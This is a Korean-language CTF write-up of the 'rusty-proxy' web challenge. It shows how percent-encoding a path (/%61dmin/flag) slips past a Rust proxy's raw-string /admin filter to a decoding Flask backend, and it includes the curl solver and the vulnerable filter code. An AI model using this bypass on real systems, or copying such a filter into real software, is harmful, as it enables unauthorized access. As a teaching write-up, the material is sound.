---
title: "[Web] rusty-proxy"
description: Writing about the "rusty-proxy" of BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

---
- Name : rusty-proxy
- Category : Web
- Description : I just vibecoded a highly secure reverse proxy using rust, I hope it works properly.
- Difficulty : ★☆☆☆☆
---

## Rusty Proxy
<img width="656" height="517" alt="image" src="https://github.com/user-attachments/assets/1112a134-6f70-43ca-b86a-197fdfc56720" />

---

## TL;DR

Rust 프록시는 `/admin` 경로를 차단하지만, **URL 인코딩된 경로** (`/%61dmin/flag`)를 디코딩 없이 문자열 비교로만 검사한다.  
프록시는 그냥 통과시키고, 뒤의 Flask 백엔드가 `%61` → `a` 로 디코딩해 `/admin/flag` 로 라우팅 → 플래그 획득.

```bash
curl "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag"
```

---

## Overview

```
[클라이언트]
    │
    │  HTTP 요청
    ▼
[Rust Proxy :80]   ← 여기서 /admin 경로 차단
    │
    │  통과된 요청 포워딩
    ▼
[Python Flask :8080]  ← /admin/flag 에 FLAG 있음
```

파일 구조:
- `proxy/src/main.rs` — Rust로 작성된 리버스 프록시 (보안 필터 포함)
- `backend/server.py` — Flask 백엔드 서버 (플래그 보유)

---

## Solution

### 1) Recon

**백엔드 (`server.py`)** 를 보면 플래그가 어디 있는지 바로 나온다.

```python
FLAG = os.getenv("FLAG", "BITSCTF{fake_flag}")

@app.route('/admin/flag')   # ← 여기!
def vault():
    return jsonify({"flag": FLAG})
```

플래그는 `/admin/flag` 엔드포인트에 있다.  
그런데 외부에서 직접 접근하면 프록시가 앞에서 막는다.

---

### 2) Root Cause

**프록시 (`main.rs`)** 의 경로 필터 코드를 보면

```rust
fn is_path_allowed(path: &str) -> bool {
    let normalized = path.to_lowercase();
    if normalized.starts_with("/admin") {  // ← 단순 문자열 비교!
        return false;
    }
    true
}
```

**문제의 핵심:**  
이 함수는 URL을 디코딩하지 않고 **있는 그대로** 문자열 비교만 한다.

| 입력 경로 | 프록시가 보는 값 | `/admin` 으로 시작? | 결과 |
|---|---|---|---|
| `/admin/flag` | `/admin/flag` | ✅ YES | **403 차단** |
| `/%61dmin/flag` | `/%61dmin/flag` | ❌ NO | **통과** ✅ |

`%61` 은 URL 인코딩에서 소문자 `a` 를 의미한다.  
프록시는 `%61` 이 `a` 인지 모른 채 그냥 백엔드로 넘겨버린다.

---

### 3) Exploit Strategy

**URL 인코딩(Percent Encoding) 우회**를 사용한다.

```
일반 경로:    /admin/flag
인코딩 경로:  /%61dmin/flag
               ^^^
               'a' 를 %61 로 인코딩
```

**공격 흐름:**

```
1. 클라이언트가 /%61dmin/flag 요청 전송
         ↓
2. Rust 프록시: "/%61dmin/flag" → starts_with("/admin")? → NO → 통과!
         ↓
3. 프록시가 백엔드에 /%61dmin/flag 그대로 전달
         ↓
4. Flask(Werkzeug): %61 → a 로 디코딩 → /admin/flag 라우팅
         ↓
5. FLAG 반환!
```

---

### 4) Why It Works

이 취약점은 **두 시스템 간의 URL 해석 불일치** 때문에 발생한다.

#### 프록시 (Rust) — URL을 Raw 문자열로 취급
```rust
// 디코딩 없이 그냥 문자열 비교
let normalized = path.to_lowercase();
if normalized.starts_with("/admin") { ... }
```
- `%61dmin` 을 `admin` 으로 인식하지 못함
- 단순히 `/` 다음에 `%` 가 오는 걸로만 봄

#### 백엔드 (Flask/Werkzeug) — URL을 표준대로 해석
```python
@app.route('/admin/flag')
def vault():
    ...
```
- HTTP 표준에 따라 `%61` → `a` 자동 디코딩
- 결국 `/admin/flag` 로 정상 라우팅됨

> **핵심 원칙**: 보안 필터는 반드시 실제 처리 시스템과 **동일한 방식으로 URL을 해석**해야 한다.
> 필터와 실행기의 해석이 다르면 항상 우회가 가능하다.

이런 종류의 취약점을 **"Parser Differential"** 또는 **"HTTP Desync"** 계열 공격이라고 부른다.

---

## Solver

```bash
# 기본 페이로드 — 'a' 를 %61 로 인코딩
curl "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag"
```

```json
{"flag": "BITSCTF{...}"}
```

---
